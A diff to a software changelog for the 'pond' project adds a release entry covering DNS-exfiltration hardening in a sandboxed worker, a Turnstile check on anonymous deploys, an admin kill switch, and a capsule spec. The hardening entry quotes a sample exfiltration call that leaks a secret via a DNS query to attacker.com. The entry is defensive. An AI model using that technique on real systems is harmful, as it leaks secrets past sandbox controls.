@@ -5,6 +5,8 @@ Versioning: [Semver](https://semver.org/spec/v2.0.0.html).
 
 ## [Unreleased]
 
+## [0.3.34] - 2026-05-28
+
 ### Added
 
 - **DNS-exfil hardening in the anonymous-worker network shim.** A restricted worker with `net.Socket.connect` blocked could still leak data through the resolver — `dns.resolveTxt("<secret>.attacker.com")` emits a query that leaves the box before any TCP connect. `installNetworkRestriction()` in `src/host/deploy-worker.ts` now blocks the full `node:dns` resolver surface — `lookup`, `lookupService`, `resolve`/`resolve4`/`resolve6`/`resolveAny`/`resolveCname`/`resolveCaa`/`resolveMx`/`resolveNaptr`/`resolveNs`/`resolvePtr`/`resolveSoa`/`resolveSrv`/`resolveTxt`, and `reverse` — across the callback API, `dns.promises`, **and** `dns.Resolver` / `dns.promises.Resolver` instances (whose methods bypass the module-level patches). Literal IPs and `localhost` still resolve so the worker can bind its own server. This is defense-in-depth at the JS layer; the OS nft rule dropping port 53 remains the real boundary. Tests in `test/deploy-worker-egress.test.mjs` cover `dns.lookup`, `dns.promises.resolve`, `dns.resolveTxt`, a `Resolver` instance, and the existing `net.Socket.connect` shim, run in isolated child processes.
@@ -12,6 +14,7 @@ Versioning: [Semver](https://semver.org/spec/v2.0.0.html).
   - **Cloudflare Turnstile on anonymous `POST /api/deploys`.** New `--turnstile-secret` flag on `pond host` (also `POND_TURNSTILE_SECRET`). When set, anonymous deploys must carry a verified Turnstile token (an `x-pond-turnstile-token` header or a `turnstileToken` body field), checked against Cloudflare's siteverify. When unset (default), there is no challenge — dev/CI and existing operators are unaffected. Authenticated deploys are never challenged. Verification is factored into `src/host/turnstile.ts` so it unit-tests with a stubbed fetch.
   - **`pond admin terminate <deployId>` operator kill switch.** New `pond admin` command group backed by the existing host token. It calls a new host-token-gated `POST /api/admin/deploys/:id/terminate` endpoint that reuses the sweep's terminate path (stop the worker; mark anonymous deploys terminated). Auth via `POND_HOST_TOKEN` / `--host-token`.
   - Docs: `docs/abuse-policy.md` and `docs/operations.md` now spell out the trust boundary (challenge → rate limit → sandbox → TTL → manual terminate); `docs/cli-reference.md` documents the new flag, env vars, and command. The "What's next" list marks both items done.
+- **Capsule Spec v1 (`docs/capsule-spec.md`).** An authoritative, versioned definition of the capsule format and wire protocol — the directory/import contract, the `pond/server` + `pond/client` API surface, every HTTP route a capsule exposes (request/response/error shapes), a conformance checklist, and a minimal worked example. Lets a coding agent (or a third-party runtime) target the capsule format without the private runtime source. Linked from `docs/llms.txt`.
 
 ## [0.3.16] - 2026-05-27
 
